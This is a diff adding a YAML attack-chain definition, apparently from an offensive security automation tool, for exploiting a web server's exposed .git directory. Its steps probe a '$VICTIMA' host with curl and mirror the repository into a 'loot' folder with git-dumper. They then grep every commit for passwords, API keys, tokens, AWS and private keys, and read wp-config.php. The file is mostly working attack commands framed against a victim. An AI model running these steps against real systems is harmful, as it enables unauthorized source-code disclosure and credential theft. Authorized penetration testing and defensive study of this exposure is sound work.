@@ -1,0 +1,45 @@
+chain_id: git_directory_exposed
+title: "Web — exposed .git directory → full source-code dump"
+severity: HIGH
+tags: [web, git, source-disclosure, recon]
+
+trigger:
+  any_of:
+    - { path_pattern: "(?i)/\\.git(/|$)" }
+    - { path_in: ["/.git/", "/.git/HEAD", "/.git/config", "/.git/index"] }
+
+description: |
+  An exposed .git directory hands you the entire source repo, including
+  every commit ever made — perfect for hunting hard-coded credentials,
+  past secret values that were "rotated," and pre-public vulnerabilities.
+
+steps:
+  - id: 1
+    title: "Probe canary endpoints"
+    command: |
+      curl -s http://$VICTIMA/.git/HEAD
+      curl -s http://$VICTIMA/.git/config
+
+  - id: 2
+    title: "Mirror with git-dumper"
+    command: |
+      pip install git-dumper
+      git-dumper http://$VICTIMA/.git ./loot
+
+  - id: 3
+    title: "Walk every commit for secrets"
+    command: |
+      cd loot
+      git log --all --oneline
+      # Pull added/removed lines that look like secrets:
+      git log -p --all | grep -iE 'password|secret|api[_-]?key|token|aws_|private_key' | head -200
+      # Or hand it to rootctl:
+      git log -p --all > everything.diff
+      rootctl extract everything.diff
+
+  - id: 4
+    title: "Read the most interesting blob directly"
+    command: git show HEAD:path/to/wp-config.php
+
+references:
+  - https://github.com/arthaud/git-dumper
